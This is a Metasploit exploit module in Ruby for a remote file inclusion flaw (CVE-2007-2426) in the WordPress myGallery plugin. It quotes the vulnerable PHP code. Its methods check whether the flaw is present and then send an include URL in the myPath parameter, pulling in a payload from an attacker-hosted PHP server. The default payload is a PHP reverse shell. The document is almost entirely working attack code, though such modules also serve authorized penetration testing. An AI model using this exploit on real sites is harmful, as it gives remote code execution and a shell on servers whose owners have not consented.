##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
# myGallery <= 1.4.b4 Remote File Include Vulnerablity
# Source Code: http://www.wildbits.de/usr_files/mygallery_1.4b4.zip
# Vulnerable Code: (myfunctions/mygallerybrowser.php:6)
# ------------------------------------------------------------------------------
# if (!$_POST){
# 	$mypath=$_GET['myPath']; <--------[+]
# 
# }
# else {
# 	$mypath=$_POST['myPath']; <--------[+]
# 	
# 	
# }
# require_once($myPath.'/wp-config.php'); <--------[+]
# ------------------------------------------------------------------------------
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  # This module sends remote including URL through HTTP GET request.
  include Msf::Exploit::Remote::HttpClient

  # Hosting a PHP server to provide webshell.
  include Msf::Exploit::Remote::HttpServer::PHPInclude

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress myGallery <= 1.4b4 Remote File Inclusion',
        'Description' => %q{
          PHP remote file inclusion vulnerability in myfunctions/mygallerybrowser.php
          in the myGallery 1.4b4 and earlier plugin for WordPress allows remote
          attackers to execute arbitrary PHP code via a URL in the myPath parameter.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'goudunz1 <goudunz1@outlook.com>' ],
        'References' => [
          [ 'EDB', '3814' ],
          [ 'CVE', '2007-2426']
        ],
        'DisclosureDate' => '2007-04-29',
        'Privileged' => false,
        'Payload' => {
          'DisableNops' => true,
          'Compat' => {
            'ConnectionType' => 'find'
          },
          'Space' => 32768
        },
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Targets' => [
          [
            'Automatic',
            { }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'PAYLOAD' => 'php/reverse_php'
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The full URI path to WordPress', '/']),
        OptString.new('PLUGINSPATH', [true, 'The relative path to the plugins folder', 'wp-content/plugins/'])
      ]
    )
  end

  def check
    timeout = 3
    uri = normalize_uri(
      target_uri.path,
      datastore['PLUGINSPATH'],
      'mygallery/myfunctions/mygallerybrowser.php'
    )
    wp_home = normalize_uri(target_uri.path)

    res = send_request_cgi({
        'method' => 'GET',
        'uri' => uri,
        'query' => "myPath=http://#{rhost}:#{rport}#{wp_home}"
      }, timeout
    )

    if not res
      CheckCode::Unknown
    elsif res.body =~ /WordPress/
      # We triggered file inclusion
      CheckCode::Vulnerable
    else
      CheckCode::Safe
    end
  end

  def php_exploit
    timeout = 3
    uri = normalize_uri(
      target_uri.path,
      datastore['PLUGINSPATH'],
      'mygallery/myfunctions/mygallerybrowser.php'
    )

    print_status("Trying #{uri}, it takes up to #{timeout} seconds")
    res = send_request_cgi({
        'method' => 'POST',
        'uri' => uri,
        'data' => "myPath=#{php_include_url}"
      }, timeout
    )

    if res
      if res.body =~ /allow_url_include/
        fail_with(Failure::NotVulnerable, 'allow_url_include is disabled')
      else
        fail_with(Failure::UnexpectedReply, "#{res.code} - Payload delivered but ignored")
      end
    else
      print_good("Server not responding for #{timeout} seconds, exploit done")
    end
  end
end
